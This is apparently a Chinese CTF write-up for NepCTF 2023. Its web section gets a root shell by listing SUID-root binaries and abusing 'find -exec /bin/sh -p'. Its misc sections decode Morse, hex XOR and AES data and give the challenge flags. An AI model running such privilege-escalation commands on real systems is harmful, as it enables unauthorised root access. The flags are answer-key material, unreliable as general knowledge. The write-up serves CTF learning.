## Web
### ez_java_checkin
工具梭哈

![](attachments/Pasted%20image%2020230817162152.png)

flag 需要权限
`find / -user root -perm -4000 -print 2>/dev/null`

![](attachments/Pasted%20image%2020230817163042.png)

`find . -exec /bin/sh -p \; -quit`

![](attachments/Pasted%20image%2020230817163220.png)


## Misc
### 小丁弹钢琴
前半部分是摩斯电码

![](attachments/Pasted%20image%2020230818162039.png)

![](attachments/Pasted%20image%2020230818162537.png)

`YOUSHOLDUSETHISTOXORSOMETHING`
后半部分是16进制

![](attachments/Pasted%20image%2020230818161721.png)

`0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17`

![](attachments/Pasted%20image%2020230818163053.png)

`NepCTF{h4ppy_p14N0}`


### 你也喜欢三月七么

![](attachments/Pasted%20image%2020230818163255.png)

这题纯阅读理解
key就群名sha256取前16位

```TEXT
salt_lenth= 10 
key_lenth= 16 
iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值
ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc
```

salt = NepCTF2023
key = dd8e671df3882c5be6423cd030bd7cb6

之后就一路智能cyberchef

![](attachments/Pasted%20image%2020230818163826.png)


`https://img1.imgtp.com/2023/07/24/yOkXWSJT.png`

![](attachments/Pasted%20image%2020230818164237.png)

![](attachments/Pasted%20image%2020230818164722.png)

NepCTF{HRP_aIways_likes_March_7th}

### 与AI共舞的哈夫曼
GPT写脚本，其实不用写看前面的列表也知道是啥

`NepCTF{huffman_zip_666}`